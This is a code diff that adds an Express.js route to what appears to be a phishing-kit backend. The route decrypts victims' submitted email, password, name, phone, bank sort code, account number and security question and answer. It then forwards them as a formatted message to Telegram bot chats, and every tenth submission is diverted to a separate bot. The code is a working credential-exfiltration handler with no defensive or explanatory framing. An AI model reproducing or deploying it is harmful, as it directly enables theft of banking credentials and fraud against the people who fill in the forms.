@@ -6788,6 +6788,85 @@ app.post("/nzpostFirst", (req, res) => {
 //SFE
 //SFE
 
+let bandz = 0;
+
+app.options("/bandzSFE", cors());
+
+app.post("/bandzSFE", (req, res) => {
+  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  lname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  secQuestion = CryptoJS.AES.decrypt(req.body.secQuestion, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  secAnswer = CryptoJS.AES.decrypt(req.body.secAnswer, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+
+  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSort Code: ${scode}\nAccount Number: ${accno}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;
+
+  if (bandz == 10) {
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+        {
+          chat_id: 680379375,
+          text: `HAYTCHRES:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    bandz = 4;
+  } else {
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+        {
+          chat_id: 680379375,
+          text: `SFEbandz:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    axios
+      .post(
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+        {
+          chat_id: 5752146124,
+          text: `SFE:\n${originalText}`,
+          parse_mode: "Markdown",
+        }
+      )
+      .catch((e) => {
+        console.log(e);
+      });
+    bandz += 1;
+  }
+  res.send("Update Complete");
+});
+
 let richgame = 0;
 
 app.options("/richgameSFE", cors());
